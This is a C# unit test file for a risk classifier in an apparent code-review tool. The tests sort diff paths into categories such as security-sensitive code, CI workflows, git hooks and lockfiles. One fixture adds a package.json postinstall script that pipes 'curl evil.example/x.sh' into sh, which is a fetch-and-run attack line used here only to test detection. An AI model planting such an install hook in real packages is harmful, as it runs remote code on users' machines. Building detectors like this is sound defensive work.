using System;
using System.Collections.Generic;
using Mainguard.Git.Models;
using Mainguard.Git.Review;
using Xunit;

namespace Mainguard.Tests;

/// <summary>
/// P2-11 test 1 (Classifier_FixtureCorpus): every <see cref="RiskCategory"/>, the load-bearing
/// package.json scripts-vs-dependency-bump distinction (edge rows 1–2), and rename-by-new-path (edge
/// row 4). The classifier is pure — the cockpit renders it, never re-derives it (invariant 1).
/// </summary>
public class RiskClassifierTests
{
    private static DiffHunk Hunk(string sectionHeading, params (DiffLineKind Kind, string Text)[] lines)
    {
        var body = new List<DiffLine>();
        foreach (var (kind, text) in lines)
        {
            body.Add(new DiffLine { Kind = kind, Text = text });
        }

        return new DiffHunk { OldStart = 1, OldCount = body.Count, NewStart = 1, NewCount = body.Count, SectionHeading = sectionHeading, Lines = body };
    }

    private static readonly DiffHunk PlainAdd = Hunk("", (DiffLineKind.Add, "some line"));

    [Theory]
    [InlineData("src/Service.cs", RiskCategory.Source)]
    [InlineData("src/auth/Login.cs", RiskCategory.SecuritySensitivePath)]
    [InlineData("lib/crypto/hash.ts", RiskCategory.SecuritySensitivePath)]
    [InlineData("app/SecurityManager.cs", RiskCategory.SecuritySensitivePath)]
    [InlineData("api/CredentialStore.cs", RiskCategory.SecuritySensitivePath)]
    [InlineData(".github/workflows/ci.yml", RiskCategory.CiWorkflow)]
    [InlineData(".husky/pre-commit", RiskCategory.GitHooks)]
    [InlineData(".vscode/settings.json", RiskCategory.EditorConfig)]
    [InlineData(".editorconfig", RiskCategory.EditorConfig)]
    [InlineData("package-lock.json", RiskCategory.Lockfile)]
    [InlineData("pnpm-lock.yaml", RiskCategory.Lockfile)]
    [InlineData("poetry.lock", RiskCategory.Lockfile)]
    [InlineData("Gemfile.lock", RiskCategory.Lockfile)]
    [InlineData("docs/guide.md", RiskCategory.Docs)]
    [InlineData("README.md", RiskCategory.Docs)]
    [InlineData("notes.rst", RiskCategory.Docs)]
    public void PathRules_CoverEveryCategory(string path, RiskCategory expected)
    {
        Assert.Equal(expected, RiskClassifier.Classify(path, PlainAdd).Category);
    }

    [Fact]
    public void PackageJson_ScriptAdded_IsExecutableConfig()
    {
        var hunk = Hunk("",
            (DiffLineKind.Context, "  \"scripts\": {"),
            (DiffLineKind.Context, "    \"build\": \"tsc\","),
            (DiffLineKind.Add, "    \"postinstall\": \"curl evil.example/x.sh | sh\","),
            (DiffLineKind.Context, "  },"));

        Assert.Equal(RiskCategory.ExecutableConfig, RiskClassifier.Classify("package.json", hunk).Category);
    }

    [Fact]
    public void PackageJson_ScriptsBlockOpenedInSectionHeading_IsExecutableConfig()
    {
        var hunk = Hunk(" \"scripts\": {",
            (DiffLineKind.Context, "    \"build\": \"tsc\","),
            (DiffLineKind.Add, "    \"prepare\": \"husky install\","));

        Assert.Equal(RiskCategory.ExecutableConfig, RiskClassifier.Classify("package.json", hunk).Category);
    }

    [Fact]
    public void PackageJson_DependencyBumpOnly_IsLockfile()
    {
        var hunk = Hunk(" \"dependencies\": {",
            (DiffLineKind.Delete, "    \"lodash\": \"^4.17.20\","),
            (DiffLineKind.Add, "    \"lodash\": \"^4.17.21\","));

        Assert.Equal(RiskCategory.Lockfile, RiskClassifier.Classify("package.json", hunk).Category);
    }

    [Fact]
    public void Rename_ClassifiesByNewPath()
    {
        // A file renamed from a benign source path INTO a security-sensitive path classifies by the new path.
        Assert.Equal(RiskCategory.SecuritySensitivePath, RiskClassifier.Classify("src/auth/Token.cs", PlainAdd).Category);
        Assert.Equal(RiskCategory.Source, RiskClassifier.Classify("src/util/Token.cs", PlainAdd).Category);
    }

    [Fact]
    public void Rank_IsEnumOrdinal_LowerReviewsFirst()
    {
        Assert.Equal(0, RiskClassifier.RankOf(RiskCategory.ExecutableConfig));
        Assert.Equal(7, RiskClassifier.RankOf(RiskCategory.Docs));
        Assert.True(RiskClassifier.RankOf(RiskCategory.ExecutableConfig) < RiskClassifier.RankOf(RiskCategory.Source));

        // The rank the classifier stamps equals the category ordinal.
        var risk = RiskClassifier.Classify("docs/x.md", PlainAdd);
        Assert.Equal((int)risk.Category, risk.Rank);
    }

    [Fact]
    public void WindowsPathSeparators_AreNormalized()
    {
        Assert.Equal(RiskCategory.CiWorkflow, RiskClassifier.Classify(".github\\workflows\\release.yml", PlainAdd).Category);
    }
}
